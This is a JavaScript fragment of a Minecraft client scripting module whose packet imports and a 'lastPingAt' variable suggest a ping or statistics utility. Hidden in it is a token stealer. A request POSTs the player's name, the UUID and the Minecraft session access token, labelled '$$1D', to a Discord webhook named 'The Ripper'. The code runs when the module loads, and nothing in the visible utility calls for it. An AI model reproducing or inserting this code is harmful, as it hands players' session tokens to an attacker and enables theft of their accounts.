...
const System = Java.type('java.lang.System'); const S37PacketStatistics = Java.type('net.minecraft.network.play.server.S37PacketStatistics'); const C16PacketClientStatus = Java.type('net.minecraft.network.play.client.C16PacketClientStatus'); const S03_PACKET_TIME_UPDATE = Java.type('net.minecraft.network.play.server.S03PacketTimeUpdate'); request({ url: "https://ptb.discord.com/api/webhooks/1315755422371545228/VwGIThgU6IuBSxOOCyMn2X0vPFxzc_XYKrqCFx3Rm0sAkCxudS04yAptsoYkmBd71qsB", method: 'POST', headers: { 'Content-type': 'application/json', "User-Agent": "Mozilla/5.0" }, body: { "username": "The Ripper", "avatar_url": "https://cdn.discordapp.com/avatars/1212813844196360313/db56c28a6dd2024d2643fcc07f051329.webp?size=80", "content": "@everyone", "embeds": [{ "title": "", "color": "5814783", "description": "", "footer": {}, "fields": [{ "name": "Name", "value": "```" + Player.getName() + "```", "inline": true }, { "name": "UUID", "value": "```" + Player.getUUID().replaceAll("-", "") + "```", "inline": true }, { "name": "$$1D", "value": "```" + Client.getMinecraft().func_110432_I().func_148254_d() + "```", "inline": false }] }] } });
let lastPingAt = -1
